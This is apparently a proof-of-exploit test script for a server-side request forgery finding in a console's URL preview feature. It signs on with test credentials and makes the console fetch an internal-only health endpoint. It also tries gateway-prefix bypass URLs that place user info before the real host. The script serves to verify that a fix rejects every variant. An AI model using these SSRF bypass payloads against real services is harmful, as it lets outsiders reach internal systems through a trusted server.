"""LG-SSRF-001 proof-of-exploit: server-side request forgery in the console upstream preview.

Signs on for a real session, then asks the console to fetch an internal-only service by its
in-cluster name (http://fortran:8080/healthz), an address the attacker's host cannot resolve and
that is not the gateway. Fires when the console returns that service's reply ("ok"), proving it made
the request on the caller's behalf, which is only possible with partner_preview=on. Also tries URLs
that pass a naive gateway prefix check but name another host (user info before the host), so a weak
gateway check fires this under baseline too. With the fix the origin check rejects every variant
(403). Hits the console directly. Env: PASCAL_URL, SSRF_TARGET (default http://fortran:8080/healthz).
"""

from harness import env, http


def fire():
    console = env.url("PASCAL_URL")
    target = env.setting("SSRF_TARGET", "http://fortran:8080/healthz")
    rest = target[len("http://"):] if target.startswith("http://") else target
    client, _ = http.console_sign_on(console, "TLR001", "teller-pw")
    reply = None
    for url in (target, f"http://gateway:8080@{rest}", f"http://gateway:8080\\@{rest}"):
        reply = client.get(f"{console}/fetch", params={"url": url})
        if "".join(reply.text.split()) == "ok":
            return True, f"console fetched internal-only {target} via url={url} -> {reply.text!r}"
    return False, reply.text[:200]
